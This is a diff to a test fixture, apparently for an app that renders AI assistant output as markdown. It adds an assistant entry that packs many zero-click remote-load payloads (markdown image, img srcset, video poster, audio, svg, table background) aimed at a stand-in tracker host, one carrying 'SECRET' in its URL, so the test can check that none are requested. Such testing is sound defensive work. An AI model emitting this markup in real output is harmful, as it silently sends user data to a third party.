@@ -263,6 +263,11 @@ ${'const veryLongLine = 1; '.repeat(12)}
 		retry.refs = [
 			{ kind: 'entry', label: 'Design discussion in the SPA session', nodeId: long.id, fileId: this.fileIdOf(long), entryId: this.entryIdOf(long, 1), offset: longEntry.content.indexOf(target), length: target.length },
 		];
+		// An entry whose markdown tries every way of making the browser load a remote resource without a click (none may be requested).
+		att.entries.push(makeAssistantEntry(att.entries.length, 30,
+			'Remote-load attempts: ![secret](https://tracker.evil.example/md?d=SECRET) <img src="https://tracker.evil.example/raw?d=1" srcset="https://tracker.evil.example/set 2x"> '
+			+ '<video src="https://tracker.evil.example/v" poster="https://tracker.evil.example/poster"></video> <audio src="https://tracker.evil.example/a"></audio> '
+			+ '<svg><image href="https://tracker.evil.example/svg"/></svg> <table background="https://tracker.evil.example/bg"><tr><td>cell</td></tr></table>'));
 		this.demoEntry = { session: att, index: entryIdx, quote: QUOTE };
 	}
 
